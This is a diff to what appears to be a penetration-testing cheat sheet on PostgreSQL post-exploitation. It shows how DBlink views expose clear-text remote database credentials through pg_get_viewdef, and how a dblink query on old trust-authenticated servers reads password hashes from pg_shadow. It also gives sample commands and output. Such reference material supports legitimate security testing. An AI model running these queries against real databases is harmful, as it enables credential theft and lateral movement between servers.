@@ -1058,39 +1058,114 @@ pwd
 
 07.6. Post-exploitation - DBlinks and postgres_fdw module
 ======================================================================================================
-
 1. DBLINKS
 ============
-DBlinks can be used to execute SQL queries to a remote PostgreSQL database from the PostgreSQL we are logged into. 
-DBlinks can contain valid clear-text login and password for a remote database and thus could allow us to compromise an other database.
-
-
-Example of DBlinks command containing clear-text credentials
--------------------------------------------------------------
-SELECT blockgroups.*
-    INTO temp_blockgroups
-    FROM dblink('dbname=somedb port=5432 host=someserver user=someuser password=somepwd',
-    'SELECT * FROM massgis.cens2000blocks')
-     AS blockgroups(gid int,area numeric(12,3), <SNIP>; 
-
-Queries to see open DBlinks
----------------------------
-postgres=# SELECT * FROM pg_catalog.pg_proc WHERE prosrc ILIKE '%dblink%';
-postgres=# SELECT dblink_get_connections();
-
-
-Useful links
--------------
 => https://www.postgresql.org/docs/12/dblink.html
 => https://www.postgresql.org/docs/12/contrib-dblink-get-connections.html
 => http://www.postgresonline.com/journal/archives/44-Using-DbLink-to-access-other-PostgreSQL-Databases-and-Servers.html
 
+> DBlinks allow to execute SQL queries to a remote database from the PostgreSQL database we are logged into. It can be used to 'attack' other databases on the network for example after compromising 1 database through a SQL injection vulnerability.
+
+> DBlinks can be used in a VIEW to query data from a remote database. In that context, if an authenticated attacker can display the View's query then he will see the clear-text login and password defined in the DBlinks command and thus will be able to compromise an other database.
+
+
+Example of a command to create a VIEW containing a DBlinks command
+-------------------------------------------------------------------
+
+	postgres=# CREATE VIEW test_view AS SELECT * FROM
+                        dblink('host=172.28.3.4
+                                dbname=remotedb
+                                user=dbuser
+                                password=secretpass',
+                               'SELECT id, title FROM  entries')
+                        AS remote_entries(id INT, title TEXT);
+	CREATE VIEW
+
+
+Example of a command to display all the VIEWS (without the system views)
+------------------------------------------------------------------------
+
+	postgres=# select table_name from INFORMATION_SCHEMA.views WHERE table_schema = ANY (current_schemas(false));
+
+	  table_name  
+	--------------
+	 test_view 
+	(1 row)
+
+
+Example of a command to display the query of the VIEW 'test_view' => clear-text password disclosure !!!
+---------------------------------------------------------------------------------------------------------
+
+	postgres=# SELECT pg_get_viewdef('test_view');
+                                                               pg_get_viewdef                                                                
+	---------------------------------------------------------------------------------------------------------------------------------------------
+	  SELECT remote_entries.id,                                                                                                                 +
+	     remote_entries.title                                                                                                                   +
+	    FROM dblink('host=172.28.3.4                                                                                                            +
+        	                         dbname=remotedb                                                                                            +
+	                                 user=dbuser                                                                                                +
+                	                 password=secretpass'::text, 'SELECT id, title FROM  entries'::text) remote_entries(id integer, title text);
+	(1 row)
+
+	postgres=# 
+
+
+Others useful queries
+-----------------------
+
+1. Query to see if the 'DBlinks' extension is installed
+
+	postgres=# SELECT * FROM pg_available_extensions order by 1;
+
+	        name        | default_version | installed_version |                               comment                                
+	--------------------+-----------------+-------------------+----------------------------------------------------------------------
+	 adminpack          | 1.0             |                   | administrative functions for PostgreSQL
+	 autoinc            | 1.0             |                   | functions for autoincrementing fields
+	 btree_gin          | 1.0             |                   | support for indexing common datatypes in GIN
+	 btree_gist         | 1.0             |                   | support for indexing common datatypes in GiST
+	 chkpass            | 1.0             |                   | data type for auto-encrypted passwords
+	 citext             | 1.0             |                   | data type for case-insensitive character strings
+	 cube               | 1.0             |                   | data type for multidimensional cubes
+	 dblink             | 1.1             | 1.1               | connect to other PostgreSQL databases from within a database
+	 <SNIP>
+
+
+2. Query to see open DBlinks
+
+	postgres=# SELECT dblink_get_connections();
+
+
+On a 'very' old PostgreSQL it is possible to elevate our privileges to superuser if DBlinks and local 'trust authentication' are enabled
+-----------------------------------------------------------------------------------------------------------------------------------------
+The DBLink module in PostgreSQL 8.2 before 8.2.6, 8.1 before 8.1.11, 8.0 before 8.0.15, 7.4 before 7.4.19, and 7.3 before 7.3.21, when local trust or ident authentication is used, allows remote attackers to gain privileges via unspecified vectors. NOTE: this issue exists because of an incomplete fix for CVE-2007-3278.
+
+When trust authentication is specified, PostgreSQL assumes that anyone who can connect to the server is authorized to access the database with whatever database user name they specify (even superuser names). (link: https://www.postgresql.org/docs/10/auth-methods.html#AUTH-TRUST)
+
+Example on a PostgreSQL 8: 
+
+user1=> select usename, passwd from pg_shadow;
+    	ERROR:  permission denied for relation pg_shadow
+
+user1=> SELECT * FROM dblink('host=127.0.0.1 user=admin dbname=user1', 'select usename,passwd from pg_shadow') returns (usename TEXT, passwd TEXT);
+     usename  |               passwd
+    ----------+-------------------------------------
+     admin    | md549088b3a87b8ce56ecd39259d17ff834
+     someuser | md5e7b0ce63e5eee01ee6268b3b6258e8b2
+    (2 rows)
+
+On more recent PostgreSQL database it doesn't work...
+
+auditor=> SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=Postgres', 'select usename,passwd from pg_shadow') returns (usename TEXT, passwd TEXT);
+	  ERROR:  could not establish connection
+	  DETAIL:  FATAL:  password authentication failed for user "postgres"
+	  FATAL:  password authentication failed for user "postgres"
+
 
 2. postgres_fdw module
-============
+=======================
 => https://www.postgresql.org/docs/12/postgres-fdw.html
 
-TO research...
+To research...
 
 
 07.7. PostgreSQL authentication capture
